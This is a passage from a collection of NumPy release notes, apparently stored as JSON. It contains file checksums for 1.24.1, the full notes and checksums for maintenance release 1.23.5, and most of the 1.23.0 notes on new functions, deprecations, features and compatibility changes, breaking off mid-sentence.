numpy-1.24.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b246beb773689d97307f7b4c2970f061  numpy-1.24.1-cp310-cp310-win32.whl\n    1f3823999fce821a28dee10ac6fdd721  numpy-1.24.1-cp310-cp310-win_amd64.whl\n    8eedcacd6b096a568e4cb393d43b3ae5  numpy-1.24.1-cp311-cp311-macosx_10_9_x86_64.whl\n    50bddb05acd54b4396100a70522496dd  numpy-1.24.1-cp311-cp311-macosx_11_0_arm64.whl\n    2a76bd9da8a78b44eb816bd70fa3aee3  numpy-1.24.1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    9e86658a414272f9749bde39344f9b76  numpy-1.24.1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    915dfb89054e1631574a22a9b53a2b25  numpy-1.24.1-cp311-cp311-win32.whl\n    ab7caa2c6c20e1fab977e1a94dede976  numpy-1.24.1-cp311-cp311-win_amd64.whl\n    8246de961f813f5aad89bca3d12f81e7  numpy-1.24.1-cp38-cp38-macosx_10_9_x86_64.whl\n    58366b1a559baa0547ce976e416ed76d  numpy-1.24.1-cp38-cp38-macosx_11_0_arm64.whl\n    a96f29bf106a64f82b9ba412635727d1  numpy-1.24.1-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    4c32a43bdb85121614ab3e99929e33c7  numpy-1.24.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    09b20949ed21683ad7c9cbdf9ebb2439  numpy-1.24.1-cp38-cp38-win32.whl\n    9e9f1577f874286a8bdff8dc5551eb9f  numpy-1.24.1-cp38-cp38-win_amd64.whl\n    4383c1137f0287df67c364fbdba2bc72  numpy-1.24.1-cp39-cp39-macosx_10_9_x86_64.whl\n    987f22c49b2be084b5d72f88f347d31e  numpy-1.24.1-cp39-cp39-macosx_11_0_arm64.whl\n    848ad020bba075ed8f19072c64dcd153  numpy-1.24.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    864b159e644848bc25f881907dbcf062  numpy-1.24.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    db339ec0b2693cac2d7cf9ca75c334b1  numpy-1.24.1-cp39-cp39-win32.whl\n    fec91d4c85066ad8a93816d71b627701  numpy-1.24.1-cp39-cp39-win_amd64.whl\n    619af9cd4f33b668822ae2350f446a15  numpy-1.24.1-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    46f19b4b147f8836c2bd34262fabfffa  numpy-1.24.1-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e85b245c57a10891b3025579bf0cf298  numpy-1.24.1-pp38-pypy38_pp73-win_amd64.whl\n    dd3aaeeada8e95cc2edf9a3a4aa8b5af  numpy-1.24.1.tar.gz\n\nSHA256\n------\n::\n\n    179a7ef0889ab769cc03573b6217f54c8bd8e16cef80aad369e1e8185f994cd7  numpy-1.24.1-cp310-cp310-macosx_10_9_x86_64.whl\n    b09804ff570b907da323b3d762e74432fb07955701b17b08ff1b5ebaa8cfe6a9  numpy-1.24.1-cp310-cp310-macosx_11_0_arm64.whl\n    f1b739841821968798947d3afcefd386fa56da0caf97722a5de53e07c4ccedc7  numpy-1.24.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    0e3463e6ac25313462e04aea3fb8a0a30fb906d5d300f58b3bc2c23da6a15398  numpy-1.24.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b31da69ed0c18be8b77bfce48d234e55d040793cebb25398e2a7d84199fbc7e2  numpy-1.24.1-cp310-cp310-win32.whl\n    b07b40f5fb4fa034120a5796288f24c1fe0e0580bbfff99897ba6267af42def2  numpy-1.24.1-cp310-cp310-win_amd64.whl\n    7094891dcf79ccc6bc2a1f30428fa5edb1e6fb955411ffff3401fb4ea93780a8  numpy-1.24.1-cp311-cp311-macosx_10_9_x86_64.whl\n    28e418681372520c992805bb723e29d69d6b7aa411065f48216d8329d02ba032  numpy-1.24.1-cp311-cp311-macosx_11_0_arm64.whl\n    e274f0f6c7efd0d577744f52032fdd24344f11c5ae668fe8d01aac0422611df1  numpy-1.24.1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    0044f7d944ee882400890f9ae955220d29b33d809a038923d88e4e01d652acd9  numpy-1.24.1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    442feb5e5bada8408e8fcd43f3360b78683ff12a4444670a7d9e9824c1817d36  numpy-1.24.1-cp311-cp311-win32.whl\n    de92efa737875329b052982e37bd4371d52cabf469f83e7b8be9bb7752d67e51  numpy-1.24.1-cp311-cp311-win_amd64.whl\n    b162ac10ca38850510caf8ea33f89edcb7b0bb0dfa5592d59909419986b72407  numpy-1.24.1-cp38-cp38-macosx_10_9_x86_64.whl\n    26089487086f2648944f17adaa1a97ca6aee57f513ba5f1c0b7ebdabbe2b9954  numpy-1.24.1-cp38-cp38-macosx_11_0_arm64.whl\n    caf65a396c0d1f9809596be2e444e3bd4190d86d5c1ce21f5fc4be60a3bc5b36  numpy-1.24.1-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    b0677a52f5d896e84414761531947c7a330d1adc07c3a4372262f25d84af7bf7  numpy-1.24.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    dae46bed2cb79a58d6496ff6d8da1e3b95ba09afeca2e277628171ca99b99db1  numpy-1.24.1-cp38-cp38-win32.whl\n    6ec0c021cd9fe732e5bab6401adea5a409214ca5592cd92a114f7067febcba0c  numpy-1.24.1-cp38-cp38-win_amd64.whl\n    28bc9750ae1f75264ee0f10561709b1462d450a4808cd97c013046073ae64ab6  numpy-1.24.1-cp39-cp39-macosx_10_9_x86_64.whl\n    84e789a085aabef2f36c0515f45e459f02f570c4b4c4c108ac1179c34d475ed7  numpy-1.24.1-cp39-cp39-macosx_11_0_arm64.whl\n    8e669fbdcdd1e945691079c2cae335f3e3a56554e06bbd45d7609a6cf568c700  numpy-1.24.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ef85cf1f693c88c1fd229ccd1055570cb41cdf4875873b7728b6301f12cd05bf  numpy-1.24.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    87a118968fba001b248aac90e502c0b13606721b1343cdaddbc6e552e8dfb56f  numpy-1.24.1-cp39-cp39-win32.whl\n    ddc7ab52b322eb1e40521eb422c4e0a20716c271a306860979d450decbb51b8e  numpy-1.24.1-cp39-cp39-win_amd64.whl\n    ed5fb71d79e771ec930566fae9c02626b939e37271ec285e9efaf1b5d4370e7d  numpy-1.24.1-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    ad2925567f43643f51255220424c23d204024ed428afc5aad0f86f3ffc080086  numpy-1.24.1-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cfa1161c6ac8f92dea03d625c2d0c05e084668f4a06568b77a25a89111621566  numpy-1.24.1-pp38-pypy38_pp73-win_amd64.whl\n    2386da9a471cc00a1f47845e27d916d5ec5346ae9696e01a8a34760858fe9dd2  numpy-1.24.1.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.23.5": "==========================\nNumPy 1.23.5 is a maintenance release that fixes bugs discovered after the\n1.23.4 release and keeps the build infrastructure current.\nThe Python versions supported for this release are 3.8-3.11.\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* DWesl\n* Aayush Agrawal +\n* Adam Knapp +\n* Charles Harris\n* Navpreet Singh +\n* Sebastian Berg\n* Tania Allard\n\nPull requests merged\n====================\n\nA total of 10 pull requests were merged for this release.\n\n* `22489 <https://github.com/numpy/numpy/pull/22489>`__: TST, MAINT: Replace most setup with setup_method (also teardown)\n* `22490 <https://github.com/numpy/numpy/pull/22490>`__: MAINT, CI: Switch to cygwin/cygwin-install-actionv2\n* `22494 <https://github.com/numpy/numpy/pull/22494>`__: TST: Make test_partial_iteration_cleanup robust but require leak...\n* `22592 <https://github.com/numpy/numpy/pull/22592>`__: MAINT: Ensure graceful handling of large header sizes\n* `22593 <https://github.com/numpy/numpy/pull/22593>`__: TYP: Spelling alignment for array flag literal\n* `22594 <https://github.com/numpy/numpy/pull/22594>`__: BUG: Fix bounds checking for ``random.logseries``\n* `22595 <https://github.com/numpy/numpy/pull/22595>`__: DEV: Update GH actions and Dockerfile for Gitpod\n* `22596 <https://github.com/numpy/numpy/pull/22596>`__: CI: Only fetch in actions/checkout\n* `22597 <https://github.com/numpy/numpy/pull/22597>`__: BUG: Decrement ref count in gentype_reduce if allocated memory...\n* `22625 <https://github.com/numpy/numpy/pull/22625>`__: BUG: Histogramdd breaks on big arrays in Windows\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    8a412b79d975199cefadb465279fd569  numpy-1.23.5-cp310-cp310-macosx_10_9_x86_64.whl\n    1b56e8e6a0516c78473657abf0710538  numpy-1.23.5-cp310-cp310-macosx_11_0_arm64.whl\n    c787f4763c9a5876e86a17f1651ba458  numpy-1.23.5-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    db07645022e56747ba3f00c2d742232e  numpy-1.23.5-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c63a6fb7cc16a13aabc82ec57ac6bb4d  numpy-1.23.5-cp310-cp310-win32.whl\n    3fea9247e1d812600015641941fa273f  numpy-1.23.5-cp310-cp310-win_amd64.whl\n    4222cfb36e5ac9aec348c81b075e2c05  numpy-1.23.5-cp311-cp311-macosx_10_9_x86_64.whl\n    6c7102f185b310ac70a62c13d46f04e6  numpy-1.23.5-cp311-cp311-macosx_11_0_arm64.whl\n    6b7319f66bf7ac01b49e2a32470baf28  numpy-1.23.5-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    3c60928ddb1f55163801f06ac2229eb0  numpy-1.23.5-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6936b6bcfd6474acc7a8c162a9393b3c  numpy-1.23.5-cp311-cp311-win32.whl\n    6c9af68b7b56c12c913678cafbdc44d6  numpy-1.23.5-cp311-cp311-win_amd64.whl\n    699daeac883260d3f182ae4bbbd9bbd2  numpy-1.23.5-cp38-cp38-macosx_10_9_x86_64.whl\n    6c233a36339de0652139e78ef91504d4  numpy-1.23.5-cp38-cp38-macosx_11_0_arm64.whl\n    57d5439556ab5078c91bdeffd9c0036e  numpy-1.23.5-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a8045b59187f2e0ccd4294851adbbb8a  numpy-1.23.5-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    7f38f7e560e4bf41490372ab84aa7a38  numpy-1.23.5-cp38-cp38-win32.whl\n    76095726ba459d7f761b44acf2e56bd1  numpy-1.23.5-cp38-cp38-win_amd64.whl\n    174befd584bc1b03ed87c8f0d149a58e  numpy-1.23.5-cp39-cp39-macosx_10_9_x86_64.whl\n    9cbac793d77278f5d27a7979b64f6b5b  numpy-1.23.5-cp39-cp39-macosx_11_0_arm64.whl\n    6e417b087044e90562183b33f3049b09  numpy-1.23.5-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    54fa63341eaa6da346d824399e8237f6  numpy-1.23.5-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cc14d62a158e99c57f925c86551e45f0  numpy-1.23.5-cp39-cp39-win32.whl\n    bad36b81e7e84bd7a028affa0659d235  numpy-1.23.5-cp39-cp39-win_amd64.whl\n    b4d17d6b79a8354a2834047669651963  numpy-1.23.5-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    89f6dc4a4ff63fca6af1223111cd888d  numpy-1.23.5-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    633d574a35b8592bab502ef569b0731e  numpy-1.23.5-pp38-pypy38_pp73-win_amd64.whl\n    8b2692a511a3795f3af8af2cd7566a15  numpy-1.23.5.tar.gz\n\nSHA256\n------\n::\n\n    9c88793f78fca17da0145455f0d7826bcb9f37da4764af27ac945488116efe63  numpy-1.23.5-cp310-cp310-macosx_10_9_x86_64.whl\n    e9f4c4e51567b616be64e05d517c79a8a22f3606499941d97bb76f2ca59f982d  numpy-1.23.5-cp310-cp310-macosx_11_0_arm64.whl\n    7903ba8ab592b82014713c491f6c5d3a1cde5b4a3bf116404e08f5b52f6daf43  numpy-1.23.5-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5e05b1c973a9f858c74367553e236f287e749465f773328c8ef31abe18f691e1  numpy-1.23.5-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    522e26bbf6377e4d76403826ed689c295b0b238f46c28a7251ab94716da0b280  numpy-1.23.5-cp310-cp310-win32.whl\n    dbee87b469018961d1ad79b1a5d50c0ae850000b639bcb1b694e9981083243b6  numpy-1.23.5-cp310-cp310-win_amd64.whl\n    ce571367b6dfe60af04e04a1834ca2dc5f46004ac1cc756fb95319f64c095a96  numpy-1.23.5-cp311-cp311-macosx_10_9_x86_64.whl\n    56e454c7833e94ec9769fa0f86e6ff8e42ee38ce0ce1fa4cbb747ea7e06d56aa  numpy-1.23.5-cp311-cp311-macosx_11_0_arm64.whl\n    5039f55555e1eab31124a5768898c9e22c25a65c1e0037f4d7c495a45778c9f2  numpy-1.23.5-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    58f545efd1108e647604a1b5aa809591ccd2540f468a880bedb97247e72db387  numpy-1.23.5-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b2a9ab7c279c91974f756c84c365a669a887efa287365a8e2c418f8b3ba73fb0  numpy-1.23.5-cp311-cp311-win32.whl\n    0cbe9848fad08baf71de1a39e12d1b6310f1d5b2d0ea4de051058e6e1076852d  numpy-1.23.5-cp311-cp311-win_amd64.whl\n    f063b69b090c9d918f9df0a12116029e274daf0181df392839661c4c7ec9018a  numpy-1.23.5-cp38-cp38-macosx_10_9_x86_64.whl\n    0aaee12d8883552fadfc41e96b4c82ee7d794949e2a7c3b3a7201e968c7ecab9  numpy-1.23.5-cp38-cp38-macosx_11_0_arm64.whl\n    92c8c1e89a1f5028a4c6d9e3ccbe311b6ba53694811269b992c0b224269e2398  numpy-1.23.5-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    d208a0f8729f3fb790ed18a003f3a57895b989b40ea4dce4717e9cf4af62c6bb  numpy-1.23.5-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    06005a2ef6014e9956c09ba07654f9837d9e26696a0470e42beedadb78c11b07  numpy-1.23.5-cp38-cp38-win32.whl\n    ca51fcfcc5f9354c45f400059e88bc09215fb71a48d3768fb80e357f3b457e1e  numpy-1.23.5-cp38-cp38-win_amd64.whl\n    8969bfd28e85c81f3f94eb4a66bc2cf1dbdc5c18efc320af34bffc54d6b1e38f  numpy-1.23.5-cp39-cp39-macosx_10_9_x86_64.whl\n    a7ac231a08bb37f852849bbb387a20a57574a97cfc7b6cabb488a4fc8be176de  numpy-1.23.5-cp39-cp39-macosx_11_0_arm64.whl\n    bf837dc63ba5c06dc8797c398db1e223a466c7ece27a1f7b5232ba3466aafe3d  numpy-1.23.5-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    33161613d2269025873025b33e879825ec7b1d831317e68f4f2f0f84ed14c719  numpy-1.23.5-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    af1da88f6bc3d2338ebbf0e22fe487821ea4d8e89053e25fa59d1d79786e7481  numpy-1.23.5-cp39-cp39-win32.whl\n    09b7847f7e83ca37c6e627682f145856de331049013853f344f37b0c9690e3df  numpy-1.23.5-cp39-cp39-win_amd64.whl\n    abdde9f795cf292fb9651ed48185503a2ff29be87770c3b8e2a14b0cd7aa16f8  numpy-1.23.5-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    f9a909a8bae284d46bbfdefbdd4a262ba19d3bc9921b1e76126b1d21c3c34135  numpy-1.23.5-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    01dd17cbb340bf0fc23981e52e1d18a9d4050792e8fb8363cecbf066a84b827d  numpy-1.23.5-pp38-pypy38_pp73-win_amd64.whl\n    1b1766d6f397c18153d40015ddfc79ddb715cabadc04d2d228d4e5a8bc4ded1a  numpy-1.23.5.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.23.0": "==========================\n\nThe NumPy 1.23.0 release continues the ongoing work to improve the handling and\npromotion of dtypes, increase the execution speed, clarify the documentation,\nand expire old deprecations. The highlights are:\n\n* Implementation of ``loadtxt`` in C, greatly improving its performance.\n* Exposing DLPack at the Python level for easy data exchange.\n* Changes to the promotion and comparisons of structured dtypes.\n* Improvements to f2py.\n\nSee below for the details,\n\n\nNew functions\n=============\n\n* A masked array specialization of ``ndenumerate`` is now available as\n  ``numpy.ma.ndenumerate``. It provides an alternative to ``numpy.ndenumerate``\n  and skips masked values by default.\n\n  (`gh-20020 <https://github.com/numpy/numpy/pull/20020>`__)\n\n* ``numpy.from_dlpack`` has been added to allow easy exchange of data using the\n  DLPack protocol.  It accepts Python objects that implement the ``__dlpack__``\n  and ``__dlpack_device__`` methods and returns a ndarray object which is\n  generally the view of the data of the input object.\n\n  (`gh-21145 <https://github.com/numpy/numpy/pull/21145>`__)\n\n\nDeprecations\n============\n\n* Setting ``__array_finalize__`` to ``None`` is deprecated.  It must now be\n  a method and may wish to call ``super().__array_finalize__(obj)`` after\n  checking for ``None`` or if the NumPy version is sufficiently new.\n\n  (`gh-20766 <https://github.com/numpy/numpy/pull/20766>`__)\n\n* Using ``axis=32`` (``axis=np.MAXDIMS``) in many cases had the\n  same meaning as ``axis=None``.  This is deprecated and ``axis=None``\n  must be used instead.\n\n  (`gh-20920 <https://github.com/numpy/numpy/pull/20920>`__)\n\n* The hook function ``PyDataMem_SetEventHook`` has been deprecated and the\n  demonstration of its use in tool/allocation_tracking has been removed.  The\n  ability to track allocations is now built-in to python via ``tracemalloc``.\n\n  (`gh-20394 <https://github.com/numpy/numpy/pull/20394>`__)\n\n* ``numpy.distutils`` has been deprecated, as a result of ``distutils`` itself\n  being deprecated. It will not be present in NumPy for Python >= 3.12, and\n  will be removed completely 2 years after the release of Python 3.12 For more\n  details, see :ref:`distutils-status-migration`.\n\n  (`gh-20875 <https://github.com/numpy/numpy/pull/20875>`__)\n\n* ``numpy.loadtxt`` will now give a ``DeprecationWarning`` when an integer\n  ``dtype`` is requested but the value is formatted as a floating point number.\n\n  (`gh-21663 <https://github.com/numpy/numpy/pull/21663>`__)\n\n\nExpired deprecations\n====================\n\n* The ``NpzFile.iteritems()`` and ``NpzFile.iterkeys()`` methods have been\n  removed as part of the continued removal of Python 2 compatibility. This\n  concludes the deprecation from 1.15.\n\n  (`gh-16830 <https://github.com/numpy/numpy/pull/16830>`__)\n\n* The ``alen`` and ``asscalar`` functions have been removed.\n\n  (`gh-20414 <https://github.com/numpy/numpy/pull/20414>`__)\n\n* The ``UPDATEIFCOPY`` array flag has been removed together with the enum\n  ``NPY_ARRAY_UPDATEIFCOPY``. The associated (and deprecated)\n  ``PyArray_XDECREF_ERR`` was also removed. These were all deprecated in 1.14. They\n  are replaced by ``WRITEBACKIFCOPY``, that requires calling\n  ``PyArray_ResoveWritebackIfCopy`` before the array is deallocated.\n\n  (`gh-20589 <https://github.com/numpy/numpy/pull/20589>`__)\n\n* Exceptions will be raised during array-like creation.  When an object raised\n  an exception during access of the special attributes ``__array__`` or\n  ``__array_interface__``, this exception was usually ignored.  This behaviour\n  was deprecated in 1.21, and the exception will now be raised.\n\n  (`gh-20835 <https://github.com/numpy/numpy/pull/20835>`__)\n\n* Multidimensional indexing with non-tuple values is not allowed.  Previously,\n  code such as ``arr[ind]`` where ``ind = [[0, 1], [0, 1]]`` produced a\n  ``FutureWarning`` and was interpreted as a multidimensional index (i.e.,\n  ``arr[tuple(ind)]``). Now this example is treated like an array index over a\n  single dimension (``arr[array(ind)]``).  Multidimensional indexing with\n  anything but a tuple was deprecated in NumPy 1.15.\n\n  (`gh-21029 <https://github.com/numpy/numpy/pull/21029>`__)\n\n* Changing to a dtype of different size in F-contiguous arrays is no longer\n  permitted. Deprecated since Numpy 1.11.0. See below for an extended\n  explanation of the effects of this change.\n\n  (`gh-20722 <https://github.com/numpy/numpy/pull/20722>`__)\n\n\nNew Features\n============\n\ncrackfortran has support for operator and assignment overloading\n----------------------------------------------------------------\n``crackfortran`` parser now understands operator and assignment\ndefinitions in a module. They are added in the ``body`` list of the\nmodule which contains a new key ``implementedby`` listing the names\nof the subroutines or functions implementing the operator or\nassignment.\n\n(`gh-15006 <https://github.com/numpy/numpy/pull/15006>`__)\n\nf2py supports reading access type attributes from derived type statements\n-------------------------------------------------------------------------\nAs a result, one does not need to use ``public`` or ``private`` statements to\nspecify derived type access properties.\n\n(`gh-15844 <https://github.com/numpy/numpy/pull/15844>`__)\n\nNew parameter ``ndmin`` added to ``genfromtxt``\n-------------------------------------------------------------------------\nThis parameter behaves the same as ``ndmin`` from ``numpy.loadtxt``.\n\n(`gh-20500 <https://github.com/numpy/numpy/pull/20500>`__)\n\n``np.loadtxt`` now supports quote character and single converter function\n-------------------------------------------------------------------------\n``numpy.loadtxt`` now supports an additional ``quotechar`` keyword argument\nwhich is not set by default.  Using ``quotechar='\"'`` will read quoted fields\nas used by the Excel CSV dialect.\n\nFurther, it is now possible to pass a single callable rather than a dictionary\nfor the ``converters`` argument.\n\n(`gh-20580 <https://github.com/numpy/numpy/pull/20580>`__)\n\nChanging to dtype of a different size now requires contiguity of only the last axis\n-----------------------------------------------------------------------------------\nPreviously, viewing an array with a dtype of a different item size required that\nthe entire array be C-contiguous. This limitation would unnecessarily force the\nuser to make contiguous copies of non-contiguous arrays before being able to\nchange the dtype.\n\nThis change affects not only ``ndarray.view``, but other construction\nmechanisms, including the discouraged direct assignment to ``ndarray.dtype``.\n\nThis change expires the deprecation regarding the viewing of F-contiguous\narrays, described elsewhere in the release notes.\n\n(`gh-20722 <https://github.com/numpy/numpy/pull/20722>`__)\n\nDeterministic output files for F2PY\n-----------------------------------\nFor F77 inputs, ``f2py`` will generate ``modname-f2pywrappers.f``\nunconditionally, though these may be empty.  For free-form inputs,\n``modname-f2pywrappers.f``, ``modname-f2pywrappers2.f90`` will both be generated\nunconditionally, and may be empty. This allows writing generic output rules in\n``cmake`` or ``meson`` and other build systems. Older behavior can be restored\nby passing ``--skip-empty-wrappers`` to ``f2py``. :ref:`f2py-meson` details usage.\n\n(`gh-21187 <https://github.com/numpy/numpy/pull/21187>`__)\n\n``keepdims`` parameter for ``average``\n--------------------------------------\nThe parameter ``keepdims`` was added to the functions ``numpy.average``\nand ``numpy.ma.average``.  The parameter has the same meaning as it\ndoes in reduction functions such as ``numpy.sum`` or ``numpy.mean``.\n\n(`gh-21485 <https://github.com/numpy/numpy/pull/21485>`__)\n\nNew parameter ``equal_nan`` added to ``np.unique``\n--------------------------------------------------\n``np.unique`` was changed in 1.21 to treat all ``NaN`` values as equal and return\na single ``NaN``. Setting ``equal_nan=False`` will restore pre-1.21 behavior\nto treat ``NaNs`` as unique. Defaults to ``True``.\n\n(`gh-21623 <https://github.com/numpy/numpy/pull/21623>`__)\n\n\nCompatibility notes\n===================\n\n1D ``np.linalg.norm`` preserves float input types, even for scalar results\n--------------------------------------------------------------------------\nPreviously, this would promote to ``float64`` when the ``ord`` argument was\nnot one of the explicitly listed values, e.g. ``ord=3``::\n\n    >>> f32 = np.float32([1, 2])\n    >>> np.linalg.norm(f32, 2).dtype\n    dtype('float32')\n    >>> np.linalg.norm(f32, 3)\n    dtype('float64')   numpy 1.22\n    dtype('float32')   numpy 1.23\n\nThis change affects only ``float32`` and ``float16`` vectors with ``ord``\nother than ``-Inf``, ``0``, ``1``, ``2``, and ``Inf``.\n\n(`gh-17709 <https://github.com/numpy/numpy/pull/17709>`__)\n\nChanges to structured (void) dtype promotion and comparisons\n------------------------------------------------------------\nIn general, NumPy now defines correct, but slightly limited, promotion for\nstructured dtypes by promoting the subtypes of each field instead of raising\nan exception::\n\n    >>> np.result_type(np.dtype(\"i,i\"), np.dtype(\"i,d\"))\n    dtype([('f0', '<i4'), ('f1', '<f8')])\n\nFor promotion matching field names, order, and titles are enforced, however\npadding is ignored.\nPromotion involving structured dtypes now always ensures native byte-order for\nall fields (which may change the result of ``np.concatenate``)\nand ensures that the result will be \"packed\", i.e. all fields are ordered\ncontiguously and padding is removed.\nSee :ref:`structured_dtype_comparison_and_promotion` for further details.\n\nThe ``repr`` of aligned structures will now never print the long form including\n``offsets`` and ``itemsize`` unless the structure includes padding not\nguaranteed by ``align=True``.\n\nIn alignment with the above changes to the promotion logic, the\ncasting safety has been updated:\n\n* ``\"equiv\"`` enforces matching names and titles. The itemsize\n  is allowed to differ due to padding.\n* ``\"safe\"`` allows mismatching field names and titles\n* The cast safety is limited by the cast safety of each included\n  field.\n* The order of fields is used to decide cast safety of each\n  individual field.  Previously, the field names were used and\n  only unsafe casts were possible when names mismatched.\n\nThe main important change here is that name mismatches are now\nconsidered \"safe\" casts.\n\n(`gh-19226 <https://github.com/numpy/numpy/pull/19226>`__)\n\n``NPY_RELAXED_STRIDES_CHECKING`` has been removed\n-------------------------------------------------\nNumPy cannot be compiled with ``NPY_RELAXED_STRIDES_CHECKING=0``\nanymore.  Relaxed strides have been the default for many years and\nthe option was initially introduced to allow a smoother transition.\n\n(`gh-20220 <https://github.com/numpy/numpy/pull/20220>`__)\n\n``np.loadtxt`` has recieved several changes\n-------------------------------------------\n\nThe row counting of ``numpy.loadtxt`` was fixed.  ``loadtxt`` ignores fully\nempty lines in the file, but counted them towards ``max_rows``.\nWhen ``max_rows`` is used and the file contains empty lines, these will now\nnot be counted.  Previously, it was possible that the result contained fewer\nthan ``max_rows`` rows even though more data was available to be read.\nIf the old behaviour is required, ``itertools.islice`` may be used::\n\n    import itertools\n    lines = itertools.islice(open(\"file\"), 0, max_rows)\n    result = np.loadtxt(lines, ...)\n\nWhile generally much faster and improved, ``numpy.loadtxt`` may now fail to\nconverter certain strings to numbers that were previously successfully read.\nThe most important cases for this are:\n\n* Parsing floating point values such as ``1.0`` into integers is now deprecated.\n* Parsing hexadecimal floats such as ``0x3p3`` will fail\n* An ``_`` was previously accepted as a thousands delimiter ``100_000``.\n  This will now result in an error.\n\nIf you experience these limitations, they can all be worked around by passing\nappropriate ``converters=``.  NumPy now supports passing a single converter\nto be used for all columns to make this more convenient.\nFor example, ``converters=float.fromhex`` can read hexadecimal float numbers\nand ``converters=int`` will be able to read ``100_000``.\n\nFurther, the error messages have been generally improved.  However, this means\nthat error types may differ.  In particularly, a ``ValueError`` is now always\nraised when parsing of a single entry fails.\n\n(`gh-20580 <https://github.com/numpy/numpy/pull/20580>`__)\n\n\nImprovements\n============\n\n``ndarray.__array_finalize__`` is now callable\n----------------------------------------------\nThis means subclasses can now use ``super().__array_finalize__(obj)``\nwithout worrying whether ``ndarray`` is their superclass or not.\nThe actual call remains a no-op.\n\n(`gh-20766 <https://github.com/numpy/numpy/pull/20766>`__)\n\nAdd support for VSX4/Power10\n----------------------------------------------\nWith VSX4/Power10 enablement, the new instructions available in\nPower ISA 3.1 can be used to accelerate some NumPy operations,\ne.g., floor_divide, modulo, etc.\n\n(`gh-20821 <https://github.com/numpy/numpy/pull/20821>`__)\n\n``np.fromiter`` now accepts objects and subarrays\n-------------------------------------------------\nThe ``numpy.fromiter`` function now supports object and\nsubarray dtypes. Please see he function documentation for\nexamples.\n\n(`gh-20993 <https://github.com/numpy/numpy/pull/20993>`__)\n\nMath C library feature detection now uses correct signatures\n------------------------------------------------------------\nCompiling is preceded by a detection phase to determine whether the\nunderlying libc supports certain math operations. Previously this code\ndid not respect the proper signatures. Fixing this enables compilation\nfor the ``wasm-ld`` backend (compilation for web assembly) and reduces\nthe number of warnings.\n\n(`gh-21154 <https://github.com/numpy/numpy/pull/21154>`__)\n\n``np.kron`` now maintains subclass information\n----------------------------------------------\n``np.kron`` maintains subclass information now such as masked arrays\nwhile computing the Kronecker product of the inputs\n\n.. code-block:: python\n\n    >>> x = ma.array([[1, 2], [3, 4]], mask=[[0, 1], [1, 0]])\n    >>> np.kron(x,x)\n    masked_array(\n      data=[[1, --, --, --],\n            [--, 4, --, --],\n            [--, --, 4, --],\n            [--, --, --, 16]],\n      mask=[[False,  True,  True,  True],\n            [ True, False,  True,  True],\n            [ True,  True, False,  True],\n            [ True,  True,  True, False]],\n      fill_value=999999)\n\n.. warning::\n    ``np.kron`` output now follows ``ufunc`` ordering (``multiply``)\n    to determine the output class type\n\n    .. code-block:: python\n\n        >>> class myarr(np.ndarray):\n        >>>    __array_priority__ = -1\n        >>> a = np.ones([2, 2])\n        >>> ma = myarray(a.shape, a.dtype, a.data)\n        >>> type(np.kron(a, ma)) == np.ndarray\n        False  Before it was True\n        >>> type(np.kron(a, ma)) == myarr\n        True\n\n(`gh-21262 <https://github.com/numpy/numpy/pull/21262>`__)\n\n\nPerformance improvements and changes\n====================================\n\nFaster ``np.loadtxt``\n---------------------\n``numpy.loadtxt`` is now generally much faster than previously as most of it\nis now implemented in C.\n\n(`gh-20580 <https://github.com/numpy/numpy/pull/20580>`__)\n\nFaster reduction operators\n--------------------------\nReduction operations like ``numpy.sum``, ``numpy.prod``, ``numpy.add.reduce``,\n``numpy.logical_and.reduce`` on 